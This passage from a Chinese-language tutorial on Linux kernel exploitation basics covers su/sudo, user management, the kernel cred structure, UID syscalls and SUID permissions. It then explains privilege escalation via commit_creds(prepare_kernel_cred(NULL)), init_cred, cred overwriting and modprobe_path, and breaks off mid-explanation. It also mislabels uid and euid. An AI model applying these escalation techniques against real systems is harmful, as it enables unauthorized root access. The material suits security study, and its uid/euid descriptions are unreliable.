<li><p><code>su</code> 不带参数的话默认切换到 root 用户，而 root 用户通常禁用密码，也就是说<strong>直接运行 su 命令是切换不到 root 权限的</strong>。</p>
</li>
<li><p><code>sudo su</code> 的意思是以 root 权限运行 <code>su</code> 命令，只需要在 <code>sudo</code> 的时候输入<strong>当前用户</strong>密码。之后执行 <code>su</code> 命令的时候由于没有切换用户所以不需要输入 root 用户密码。（同理 <code>sudo bash</code> 也可以切换到 root 用户）</p>
</li>
</ul>

    </div>
  </div></li>
</ul>

  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>提示</p>

    </div>
    <div class="notel-content">
      <p><code>su</code> 和 <code>sudo</code> 命令之所以能够改变权限是因为这两个文件具有 SUID（Set User ID upon execution）权限。</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/ ~ <span class="built_in">ls</span> -l $(<span class="built_in">which</span> su)</span><br><span class="line">-rwsr-xr-x 1 root root 55680 Apr  9  2024 /usr/bin/su</span><br><span class="line">/ ~ <span class="built_in">ls</span> -l $(<span class="built_in">which</span> <span class="built_in">sudo</span>)</span><br><span class="line">-rwsr-xr-x 1 root root 232416 Apr  4  2023 /usr/bin/sudo</span><br></pre></td></tr></table></figure></div>

    </div>
  </div>

<h4 id="用户信息管理"><a href="#用户信息管理" class="headerlink" title="用户信息管理"></a>用户信息管理</h4><ul>
<li><p><strong>创建用户</strong>：<code>sudo useradd -m username</code></p>
<ul>
<li><code>-m</code>：为用户创建主目录（如 <code>/home/username</code>）。</li>
<li><code>-s</code>：指定用户的登录Shell，例如 <code>-s /bin/bash</code>。</li>
<li><code>-G</code>：将用户添加到一个或多个组，例如 <code>-G sudo,developers</code>。</li>
</ul>
</li>
<li><p><strong>修改用户密码</strong>：<code>passwd username</code></p>
<ul>
<li>修改用户：<code>username</code> 的登录密码，提示输入新密码。</li>
</ul>
</li>
<li><p><strong>修改用户</strong>: <code>sudo usermod -aG groupname username</code></p>
<ul>
<li><code>-aG</code>：将用户添加到指定组，<code>-a</code> 选项确保用户保留其当前的组成员身份。</li>
<li><code>-l newname</code>：修改用户的用户名为 <code>newname</code>。</li>
<li><code>-d new_home_directory</code>：更改用户的主目录为 <code>new_home_directory</code>。</li>
</ul>
</li>
<li><p><strong>删除用户</strong>：<code>sudo userdel -r username</code></p>
<ul>
<li><code>-r</code>：删除用户并同时删除其主目录及关联的邮件目录。</li>
</ul>
</li>
<li><p><strong>创建组</strong>：<code>sudo groupadd groupname</code></p>
<ul>
<li>无其他参数时，默认创建一个新组。</li>
</ul>
</li>
<li><p><strong>删除组</strong>：<code>sudo groupdel groupname</code></p>
<ul>
<li>无其他参数时，删除指定的用户组。</li>
</ul>
</li>
<li><p><strong>管理组成员</strong>：<code>sudo gpasswd -a username groupname</code></p>
<ul>
<li><code>-a</code>：将用户 <code>username</code> 添加到组 <code>groupname</code>。</li>
</ul>
</li>
</ul>
<h3 id="用户权限的内核表示"><a href="#用户权限的内核表示" class="headerlink" title="用户权限的内核表示"></a>用户权限的内核表示</h3><h4 id="用户权限管理结构"><a href="#用户权限管理结构" class="headerlink" title="用户权限管理结构"></a>用户权限管理结构</h4><p>注意到 <code>task_struct</code> 的源码中有如下代码：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 进程的权限凭据信息 */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 调试器附加时的调试器权限凭据: */</span></span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>		*<span class="title">ptracer_cred</span>;</span> </span><br><span class="line"><span class="comment">/* 用于记录当调试器（如 gdb）附加到当前进程时，调试器的凭据信息。</span></span><br><span class="line"><span class="comment">   主要用于权限检查，确保调试器有足够的权限操作目标进程。 */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 目标上下文和实际主观上下文（通过写时复制机制） */</span></span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>		*<span class="title">real_cred</span>;</span></span><br><span class="line"><span class="comment">/* 指向任务的目标和真实的主观凭据，描述任务的实际身份信息。</span></span><br><span class="line"><span class="comment">   此上下文用于其他任务操作当前任务时的权限检查，例如真实 UID、真实 GID 等。 */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 当前有效的（可重写的）主观任务凭据（通过写时复制机制） */</span></span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>		*<span class="title">cred</span>;</span></span><br><span class="line"><span class="comment">/* 描述当前任务的有效凭据，用于任务对其他对象执行操作时的权限检查。</span></span><br><span class="line"><span class="comment">   通常指向与 `real_cred` 相同的上下文，但在需要临时提升权限时可以指向其他上下文。 */</span></span><br></pre></td></tr></table></figure></div>

<p>这些是 kernel 用以判断一个进程权限的凭证，在 kernel 中使用 <code>cred</code> 结构体进行标识，对于一个进程而言应当有三个 <code>cred</code> ：</p>
<ul>
<li><p><strong><code>ptracer_cred</code>：</strong> 这个字段存储了 <strong>跟踪者（Tracer）</strong> 的凭证信息。</p>
</li>
<li><p>当一个进程附加到另一个进程（如调试器附加到目标进程时），跟踪者的凭证信息被保存到这个字段。</p>
</li>
<li><p>内核在 <code>ptrace</code> 调用时，会对 <code>ptracer_cred</code> 进行权限验证。</p>

  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>提示</p>

    </div>
    <div class="notel-content">
      <p>某些反调试方法就是利用<strong>提前占用 <code>ptracer_cred</code></strong> 的原理来阻止调试器（例如 <code>gdb</code>）附加到进程上，从而实现反调试效果。</p>

    </div>
  </div>
</li>
<li><p><strong><code>real_cred</code>：</strong>即<strong>客体凭证</strong>（<strong>objective cred</strong>），通常是一个进程最初启动时所具有的权限。<strong>通常这个字段不会发生变化，用来记录进程原本的权限。</strong></p>
</li>
<li><p><strong><code>cred</code>：</strong>即<strong>主体凭证</strong>（<strong>subjective cred</strong>），该进程的有效 <code>cred</code> ，<strong>linux 以此作为进程权限的凭证</strong>。</p>
</li>
</ul>
<p> <code>cred</code> 结构体定义于内核源码 <code>include/linux/cred.h</code> 中，具体如下：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 任务的安全上下文结构体</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 这个结构体用于描述任务（进程）的安全属性信息，包括用户 ID、组 ID、</span></span><br><span class="line"><span class="comment"> * 权限能力（Capabilities）、密钥管理和安全模块等内容。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 每个任务有两个指向安全上下文的指针：</span></span><br><span class="line"><span class="comment"> * 1. task-&gt;real_cred: 描述任务的实际身份信息（目标上下文），</span></span><br><span class="line"><span class="comment"> *    主要用于其他任务操作当前任务时的权限检查。</span></span><br><span class="line"><span class="comment"> * 2. task-&gt;cred: 描述任务在执行操作时的身份信息（主观上下文），</span></span><br><span class="line"><span class="comment"> *    用于判断任务对其他对象的操作权限。</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * 在正常情况下，task-&gt;cred 和 task-&gt;real_cred 指向相同的上下文。</span></span><br><span class="line"><span class="comment"> * 但在某些特定情况下（如权限临时提升），task-&gt;cred 会被切换到其他上下文。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> &#123;</span></span><br><span class="line">    <span class="type">atomic_t</span> usage;               <span class="comment">// 引用计数，标识当前结构体被多少任务使用</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line">    <span class="type">atomic_t</span> subscribers;         <span class="comment">// 使用该结构体的任务数量（仅用于调试）</span></span><br><span class="line">    <span class="type">void</span> *put_addr;               <span class="comment">// 记录最后释放该结构体的调用地址（调试用）</span></span><br><span class="line">    <span class="type">unsigned</span> magic;               <span class="comment">// 魔数，用于验证结构体状态</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CRED_MAGIC        0x43736564  <span class="comment">// 正常状态的魔数</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CRED_MAGIC_DEAD   0x44656144  <span class="comment">// 已释放状态的魔数</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 用户 ID 和组 ID</span></span><br><span class="line">    <span class="type">kuid_t</span> uid;                   <span class="comment">// 实际用户 ID</span></span><br><span class="line">    <span class="type">kgid_t</span> gid;                   <span class="comment">// 实际组 ID</span></span><br><span class="line">    <span class="type">kuid_t</span> suid;                  <span class="comment">// 保存的用户 ID（用于权限恢复）</span></span><br><span class="line">    <span class="type">kgid_t</span> sgid;                  <span class="comment">// 保存的组 ID（用于权限恢复）</span></span><br><span class="line">    <span class="type">kuid_t</span> euid;                  <span class="comment">// 有效用户 ID（执行操作时的权限检查依据）</span></span><br><span class="line">    <span class="type">kgid_t</span> egid;                  <span class="comment">// 有效组 ID（执行操作时的权限检查依据）</span></span><br><span class="line">    <span class="type">kuid_t</span> fsuid;                 <span class="comment">// 文件系统操作时的用户 ID</span></span><br><span class="line">    <span class="type">kgid_t</span> fsgid;                 <span class="comment">// 文件系统操作时的组 ID</span></span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> securebits;          <span class="comment">// SUID 程序的安全标志位，用于管理权限</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 权限能力（Capabilities）</span></span><br><span class="line">    <span class="type">kernel_cap_t</span> cap_inheritable; <span class="comment">// 子进程可继承的权限</span></span><br><span class="line">    <span class="type">kernel_cap_t</span> cap_permitted;   <span class="comment">// 当前进程允许的权限</span></span><br><span class="line">    <span class="type">kernel_cap_t</span> cap_effective;   <span class="comment">// 当前进程实际可用的权限</span></span><br><span class="line">    <span class="type">kernel_cap_t</span> cap_bset;        <span class="comment">// 能力边界集（限制权限的范围）</span></span><br><span class="line">    <span class="type">kernel_cap_t</span> cap_ambient;     <span class="comment">// 环境能力集（附加到当前环境的权限）</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> jit_keyring;    <span class="comment">// 默认密钥环的分配方式</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span> __<span class="title">rcu</span> *<span class="title">session_keyring</span>;</span> <span class="comment">// 继承自父进程的会话密钥环</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span> *<span class="title">process_keyring</span>;</span>  <span class="comment">// 进程独有的密钥环</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span> *<span class="title">thread_keyring</span>;</span>   <span class="comment">// 线程独有的密钥环</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span> *<span class="title">request_key_auth</span>;</span> <span class="comment">// 进程的授权密钥</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line">    <span class="type">void</span> *security;               <span class="comment">// LSM（Linux 安全模块）的安全信息</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span>     <span class="comment">// 关联的实际用户信息</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_namespace</span> *<span class="title">user_ns</span>;</span> <span class="comment">// 用户命名空间，决定权限范围</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">group_info</span> *<span class="title">group_info</span>;</span> <span class="comment">// 辅助组信息（如用户附加的组）</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> <span class="title">rcu</span>;</span>          <span class="comment">// 用于 RCU（Read-Copy-Update）删除操作的钩子</span></span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure></div>

<p>一个 <code>cred</code> 结构体中记载了<strong>一个进程四种不同的用户 ID</strong>：</p>
<ul>
<li><strong>有效用户 ID（<code>uid</code>，Effective User ID）</strong>：标识进程当前正在运行时的有效用户身份，<strong>决定进程在访问资源时的权限</strong>（例如访问文件、执行系统调用等）。</li>
<li><strong>保存的用户 ID （<code>suid</code>，Saved User ID）</strong>：当进程通过某些系统调用（如 <code>setuid()</code>）切换到新的有效用户 ID 时，<code>suid</code> 会保存进程切换之前的 <code>uid</code>，用于恢复到原来的权限状态。</li>
<li><strong>实际用户 ID（<code>euid</code>，Real User ID）</strong>：<code>euid</code> 记录了进程的“真实身份”，即启动该进程的用户。</li>
<li><strong>文件系统用户 ID（<code>fsuid</code>，File System User ID）</strong>：用于文件系统权限检查的用户 ID，进程访问文件系统资源时，会根据 <code>fsuid</code> 执行权限检查。设置这个字段是为了允许进程在文件系统操作中使用不同的身份而不影响其他权限相关操作。</li>
</ul>
<p>通常情况下这四个值都是相同的。</p>
<p>用户组 ID 同样分为四个：有效组（<code>gid</code>）、保存组（<code>sgid</code>)、真实组（<code>egid</code>）、文件系统组（<code>fsgid</code>）与上面类似。</p>
<h4 id="相关系统调用"><a href="#相关系统调用" class="headerlink" title="相关系统调用"></a>相关系统调用</h4><p>Linux 内核提供了一系列的系统调用供我们修改进程的 4 个用户 ID 和 4 个用户组 ID：</p>
<p><strong>设置 uid 相关系统调用</strong></p>
<ul>
<li>**<code>setuid(uid_t uid)</code>**：设置进程的实际用户 ID和有效用户 ID。</li>
<li>**<code>setgid(gid_t gid)</code>**：设置进程的实际组 ID和有效组 ID。</li>
<li>**<code>seteuid(uid_t euid)</code>**：设置进程的有效用户 ID。</li>
<li>**<code>setegid(gid_t egid)</code>**：设置进程的有效组 ID。</li>
<li>**<code>setresuid(uid_t ruid, uid_t euid, uid_t suid)</code>**：同时设置实际、有效和保存的用户 ID。</li>
<li>**<code>setresgid(gid_t rgid, gid_t egid, gid_t sgid)</code>**：同时设置实际、有效和保存的组 ID。</li>
</ul>
<p><strong>获取 uid 相关系统调用</strong></p>
<ul>
<li>**<code>getuid()</code>**：获取当前进程的实际用户 ID。</li>
<li>**<code>geteuid()</code>**：获取当前进程的有效用户 ID。</li>
<li>**<code>getgid()</code>**：获取当前进程的实际组 ID。</li>
<li>**<code>getegid()</code>**：获取当前进程的有效组 ID。</li>
<li>**<code>getresuid(uid_t *ruid, uid_t *euid, uid_t *suid)</code>**：同时获取实际、有效和保存的用户 ID。</li>
<li>**<code>getresgid(gid_t *rgid, gid_t *egid, gid_t *sgid)</code>**：同时获取实际、有效和保存的组 ID。</li>
</ul>

  <div class="note-large red">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>注意</p>

    </div>
    <div class="notel-content">
      <p><code>fsuid</code> 是一个内核空间的概念，它属于进程的内核数据结构（<code>task_struct</code>），并用于内核内部的权限控制。因此<strong>用户空间程序无法获取或修改 <code>fsuid</code>。</strong></p>

    </div>
  </div>

<h4 id="权限修改规则"><a href="#权限修改规则" class="headerlink" title="权限修改规则"></a>权限修改规则</h4><p> 这里仅介绍用户 ID 的修改规则，转换关系如下图所示。用户组 ID 与用户 ID 的修改规则类似。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/privilege_change_rule.svg"
                      style="zoom: 200%;" 
                >

<ul>
<li>当 <code>uid</code> 和 <code>euid</code> 有一个为 0 时都可以转换成 <code>uid = 0</code> 的状态，此时权限为 root 权限。</li>
<li>当 <code>uid</code> 和 <code>euid</code> 都非 0 时，则此时权限为非 root 权限。</li>
</ul>

  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>提示</p>

    </div>
    <div class="notel-content">
      <p>从上面的规则可以看出，<code>suid</code> 这个字段存在感不强。个人理解这个变量是 linux 内核给我们提供的一个保存之前权限的地方。当然这里的保存需要手动 <code>setsuid</code> 保存。由于这个变量由内核维护，因此可以实现父子进程的传递，具有用户程序内部变量保存无法比拟的优势。</p>

    </div>
  </div>

<h3 id="相关提权思路"><a href="#相关提权思路" class="headerlink" title="相关提权思路"></a>相关提权思路</h3><h4 id="commit-creds-提权"><a href="#commit-creds-提权" class="headerlink" title="commit_creds 提权"></a>commit_creds 提权</h4><p>只要我们改变一个进程的 <code>cred</code> 结构体，就能改变其执行权限。</p>
<p>内核空间下面有两个函数，都位于 <code>kernel/cred.c</code> 中：</p>
<ul>
<li><code>struct cred* prepare_kernel_cred(struct task_struct* daemon)</code>：该函数用以拷贝一个进程的 <code>cred</code> 结构体，并返回一个新的 <code>cred</code> 结构体，需要注意的是 <code>daemon</code> 参数应为有效的进程描述符地址或者 NULL 。</li>
<li><code>int commit_creds(struct cred *new)</code>：该函数用以将一个新的<code>cred</code>结构体应用到进程。</li>
</ul>
<p>查看<code>prepare_kernel_cred()</code>函数源码，观察到如下逻辑：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> cred *<span class="title function_">prepare_kernel_cred</span><span class="params">(<span class="keyword">struct</span> task_struct *daemon)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">old</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">new</span>;</span></span><br><span class="line"></span><br><span class="line">	new = kmem_cache_alloc(cred_jar, GFP_KERNEL);</span><br><span class="line">	<span class="keyword">if</span> (!new)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	kdebug(<span class="string">&quot;prepare_kernel_cred() alloc %p&quot;</span>, new);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (daemon)</span><br><span class="line">		old = get_task_cred(daemon);</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		old = get_cred(&amp;init_cred);</span><br><span class="line">...</span><br></pre></td></tr></table></figure></div>

<p>在 <code>prepare_kernel_cred()</code> 函数中，若传入的参数为 NULL ，则会缺省使用 <code>init</code> 进程的 <code>cred</code> 作为模板进行拷贝，<strong>即可以直接获得一个标识着 root 权限的 cred 结构体</strong>。那么我们不难想到，只要我们能够在内核空间执行 <code>commit_creds(prepare_kernel_cred(NULL))</code> ，那么就能够将进程的权限提升到 root。</p>
<p>如果进行 ROP 提权有一个难点就是寻找将 rax 赋值给 rdi 的 gadget 。可以尝试搜索 <code>xchg rax, rdi</code> ，<code>push rax; pop rdi</code>，<code>mov rdi, rax</code> 等 gadget 。</p>
<p>另外 <code>init_cred</code> 是在内核当中有一个特殊的 <code>cred</code> ，它是 <code>init</code> 进程的 <code>cred</code> ，因此其权限为 root ，且该 <code>cred</code> 并非是动态分配的，因此当我们泄露出内核基址之后我们也便能够获得 <code>init_cred</code> 的地址，因此我们就只需要执行一次 <code>commit_creds(&amp;init_cred)</code> 便能完成提权。</p>
<p>不过有些内核中没有 <code>init_cred</code>（实际上多数情况是由于缺少符号找不到 <code>init_cred</code>，因此需要逆向分析 <code>prepare_kernel_cred</code> 函数来定位 <code>init_cred</code>）。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-kernel-pwn-basic-knowlege/images/05061c3e0eb8ab90b2b3f95cefd42fe9.png"
                     
                ></p>
<h4 id="覆写-cred-提权"><a href="#覆写-cred-提权" class="headerlink" title="覆写 cred 提权"></a>覆写 cred 提权</h4><p>覆写 <code>cred</code> 有两种方式，一种是覆盖 <code>task_struct</code> 的 <code>cred</code> 指针指向 <code>init_cred</code>；另一种是直接覆盖 <code>cred</code> 结构体。</p>
<p>对于覆盖覆盖 <code>cred</code> 结构体的方式，通常来说只要我们能够把 <code>cred</code> 结构体的 <code>uid</code> 字段覆盖为 0 就可以实现提权。</p>
<h2 id="文件权限"><a href="#文件权限" class="headerlink" title="文件权限"></a>文件权限</h2><h3 id="文件权限表示"><a href="#文件权限表示" class="headerlink" title="文件权限表示"></a>文件权限表示</h3><h4 id="普通权限"><a href="#普通权限" class="headerlink" title="普通权限"></a>普通权限</h4><p>每个文件或目录的权限由三部分组成，每部分三个字符，分别代表<strong>用户</strong>、<strong>组</strong>和<strong>其他用户</strong>的权限。权限表示如下：</p>
<ul>
<li><strong>r</strong>: 读取权限（Read），可以查看文件内容或列出目录内容。</li>
<li><strong>w</strong>: 写入权限（Write），可以修改文件内容或在目录中添加、删除文件。</li>
<li><strong>x</strong>: 执行权限（Execute），可以执行文件（如脚本或程序）或进入目录。</li>
</ul>
<p>使用 <code>ls -l</code> 命令查看文件权限，如下示例：</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sky123@ubuntu:~$ <span class="built_in">ls</span> -l example.txt </span><br><span class="line">-rwxr-xr-x 1 sky123 sky123 525 11月 26 12:59 example.txt</span><br></pre></td></tr></table></figure></div>

<p>解释：</p>
<ul>
<li><strong><code>-</code></strong>: 普通文件（<code>d</code> 表示目录）。</li>
<li><strong><code>rwx</code></strong>: 文件所有者权限，具备读、写、执行权限。</li>
<li><strong><code>r-x</code></strong>: 所属组权限，具备读和执行权限。</li>
<li><strong><code>r--</code></strong>: 其他用户权限，具备只读权限。</li>
<li>该文件的所有者是 <code>sky123</code> 用户，该文件的所属组是 <code>sky123</code>。</li>
</ul>
<h4 id="特殊权限"><a href="#特殊权限" class="headerlink" title="特殊权限"></a>特殊权限</h4><p><strong>SUID</strong>、<strong>SGID</strong> 和 <strong>Sticky Bit</strong>，是 Linux 系统中用于增强文件和目录权限管理的特殊权限。</p>
<ul>
<li><strong>SUID (Set User ID)</strong>: <code>s</code> 替代<strong>用户</strong>的执行位，<strong>任何用户在执行该文件时，都会以文件所有者的权限运行，而不是执行者的权限</strong>。这就是 <code>su</code> 命令从低权限用户切换到高权限用户的原理（设置 SUID 权限，使用密码保护，且非特权用户无法修改）。<ul>
<li>示例：<code>rwsr-xr-x</code></li>
</ul>
</li>
<li><strong>SGID (Set Group ID)</strong>: <code>s</code> 替代<strong>组</strong>的执行位，文件执行时将以文件的所属组权限运行。对于目录，新创建的文件会继承目录的组。<ul>
<li>示例：<code>rwxr-sr-x</code></li>
</ul>
</li>
<li><strong>Sticky Bit</strong>: <code>t</code> 替代<strong>其他用户</strong>的执行位，通常用于公共目录，如 <code>/tmp</code>，限制删除操作。只有文件的所有者或目录的所有者可以删除文件，即使其他用户对目录有写权限。<ul>
<li>示例：<code>rwxrwxrwt</code></li>
</ul>
</li>
</ul>
<p>SUID 权限的可执行文件执行后产生的进程的 <code>euid</code> 等于文件所属的用户，<code>uid</code> 等于运行可执行文件的用户的 <code>uid</code> 。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/suid.svg"
                      style="zoom: 200%;" 
                >

<p><strong>如果可执行文件的所属用户是 root 用户，那么创建的进程可以通过 <code>setuid(0)</code> 把权限提升至 root 权限。</strong></p>
<p>这就是 <code>sudo</code>、<code>su</code> 等权限管理工具的原理，只不过提权那一步需要密码验证。有一些提权漏洞就是针对这一类 SUID 文件的。</p>
<h3 id="相关管理命令"><a href="#相关管理命令" class="headerlink" title="相关管理命令"></a>相关管理命令</h3><h4 id="查看文件权限"><a href="#查看文件权限" class="headerlink" title="查看文件权限"></a>查看文件权限</h4><ul>
<li><strong><code>ls -l</code></strong>: 列出文件或目录的详细信息，包括权限。</li>
<li><strong><code>stat</code></strong>: 显示文件的详细状态，包括权限和特殊位设置。<ul>
<li><code>stat filename</code> 查看 <code>filename</code> 的权限和其他详细信息。</li>
</ul>
</li>
</ul>
<h4 id="管理文件权限"><a href="#管理文件权限" class="headerlink" title="管理文件权限"></a>管理文件权限</h4><ul>
<li><strong><code>chmod</code></strong>: 修改文件或目录的权限。<ul>
<li><code>chmod 755 filename</code> 设置文件所有者为读、写、执行权限，组和其他用户为读、执行权限。</li>
<li><code>chmod u+x filename</code> 为文件所有者添加执行权限。</li>
<li><code>chmod u+s /path/to/file</code> 为文件添加 SUID 权限。</li>
<li><code>chmod g+s /path/to/directory</code> 为目录设置 SGID 权限，使新文件继承目录组。</li>
<li><code>chmod +t /path/to/directory</code> 为目录设置 Sticky Bit。</li>
</ul>
</li>
<li><strong><code>chown</code></strong>: 更改文件或目录的所有者。<ul>
<li><code>sudo chown user filename</code> 将 <code>filename</code> 的所有者更改为 <code>user</code>。</li>
<li><code>sudo chown user:group filename</code> 将 <code>filename</code> 的所有者更改为 <code>user</code>，组更改为 <code>group</code>。</li>
</ul>
</li>
<li><strong><code>chgrp</code></strong>: 更改文件或目录的组。<ul>
<li><code>sudo chgrp groupname filename</code> 更改 <code>filename</code> 的组为 <code>groupname</code>。</li>
</ul>
</li>
</ul>
<h3 id="modprobe-path-提权"><a href="#modprobe-path-提权" class="headerlink" title="modprobe_path 提权"></a>modprobe_path 提权</h3><p>一种经典的提权技术是覆盖内核中的 <code>modprobe_path</code> 变量。该变量的值在编译时设置为 <code>CONFIG_MODPROBE_PATH</code>，并使用空字节填充至 <code>KMOD_PATH_LEN</code> 长度。通常情况下，<code>CONFIG_MODPROBE_PATH</code> 被设置为 <code>/sbin/modprobe</code>，因为这是 modprobe 二进制文件的常见路径。</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ <span class="built_in">cat</span> /proc/sys/kernel/modprobe </span><br><span class="line">/sbin/modprobe</span><br></pre></td></tr></table></figure></div>

<h4 id="过程分析"><a href="#过程分析" class="headerlink" title="过程分析"></a>过程分析</h4><p>当用户执行一个文件时，系统调用 <code>execve</code> 来执行程序：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">SYSCALL_DEFINE3(execve,</span><br><span class="line">		<span class="type">const</span> <span class="type">char</span> __user *, filename,</span><br><span class="line">		<span class="type">const</span> <span class="type">char</span> __user *<span class="type">const</span> __user *, argv,</span><br><span class="line">		<span class="type">const</span> <span class="type">char</span> __user *<span class="type">const</span> __user *, envp)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> do_execve(getname(filename), argv, envp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

